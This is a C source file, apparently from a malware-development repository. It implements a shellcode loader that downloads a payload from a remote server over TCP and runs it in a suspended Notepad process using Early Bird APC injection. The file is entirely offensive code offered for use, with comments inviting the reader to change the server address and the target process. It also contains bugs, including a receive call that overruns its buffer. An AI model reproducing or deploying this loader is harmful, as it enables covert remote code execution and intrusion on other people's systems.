#include <WinSock2.h>
#include <stdio.h>
#include <Windows.h>
#include <WS2tcpip.h>

#pragma comment(lib,"Ws2_32.lib")
#define DEFAULT_BUFFLEN 1024

unsigned char shellcode[DEFAULT_BUFFLEN];

void DownloadShellcode() {

	WSADATA wsadata = { 0 };
	WSAStartup(MAKEWORD(2, 2), &wsadata);
	int responsesize;

  //Creating socket
	SOCKET shellsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (shellsock == INVALID_SOCKET) {
		printf("[!] Failed to create a socket. Exiting with error: %ld\n", WSAGetLastError());
		closesocket(shellsock);
		WSACleanup();
		exit(0);
	}
	printf("[+] Socket created successfully.\n");

	SOCKADDR_IN sockaddr = { 0 };
	sockaddr.sin_family = AF_INET;
	sockaddr.sin_port = htons(443);
  //Change the IP address & port accordingly
	InetPtonA(AF_INET, "127.0.0.1", &sockaddr.sin_addr.s_addr);
//Connecting to the created socket
	if (connect(shellsock, (SOCKADDR*)&sockaddr, sizeof(sockaddr)) < 0) {
		printf("[!] Failed to connect to socket. Exiting with error: %ld\n", WSAGetLastError());
		closesocket(shellsock);
		WSACleanup();
		exit(1);
	}
	printf("[+] Connected to server!\n");

  //Downloading the shellcode from remote server.
	if (responsesize = recv(shellsock, (char*)shellcode, 2048, 0) == SOCKET_ERROR) {
		printf("[!] Error recieving the shellcode. Exiting with error: %ld\n", WSAGetLastError());
	}
	printf("%s\n", shellcode);
	printf("[+] Size of shellcode: %d\n", sizeof(shellcode));

	shellcode[responsesize];

	closesocket(shellsock);
}


int main() {

  //usual EarlyBirdAPC Injection technique. For seperate code with explanation, see my another repo "Malware Development :) "
	DownloadShellcode();

	STARTUPINFOA stinfo = { 0 };
	PROCESS_INFORMATION pinfo = { 0 };
	DWORD oldprotect = 0;
//Replace Notepad.exe with whatever process you want to target
	BOOL SacrificialProc = CreateProcessA("C:\\Windows\\System32\\Notepad.exe", NULL, NULL, NULL, FALSE, (CREATE_SUSPENDED | CREATE_NO_WINDOW), NULL, NULL, &stinfo, &pinfo);
	if (SacrificialProc == 0) {
		printf("[!] Failed to create a sacrificial process. Exiting with error: %ld\n", GetLastError());
		return EXIT_FAILURE;
	}
	printf("[+] Sacrificial process created successfully with PID: %ld\n", pinfo.dwProcessId);

	LPVOID virtualmem = VirtualAllocEx(pinfo.hProcess, NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
	if (virtualmem == NULL) {
		printf("[!] Failed to allocate memory. Exiting with error: %ld\n", GetLastError());
		return EXIT_FAILURE;
	}
	printf("[+] Memory allocation successfull.\n\t\\----0x%p\n", virtualmem);

	if (!WriteProcessMemory(pinfo.hProcess, virtualmem, shellcode, sizeof(shellcode), NULL)) {
		printf("[!] Failed to write shellcode into memory.\nExiting with error: %ld\n", GetLastError());
		return EXIT_FAILURE;
	}
	printf("[+] Shellcode written into memory.\n\t\\----0x%p\n", shellcode);

	if (!VirtualProtectEx(pinfo.hProcess, virtualmem, sizeof(shellcode), PAGE_EXECUTE_READ, &oldprotect)) {
		printf("[!] Failed to change the memory protection. Exiting with error: %ld\n", GetLastError());
		return EXIT_FAILURE;
	} 
	printf("[+] Changed memory protection from PAGE_READ_WRITE to PAGE_EXECUTE_READ\n");

	QueueUserAPC((PAPCFUNC)virtualmem, pinfo.hThread, NULL);
	ResumeThread(pinfo.hThread);
	printf("[+] Shellcode Executed!\n");

	return EXIT_SUCCESS;
}
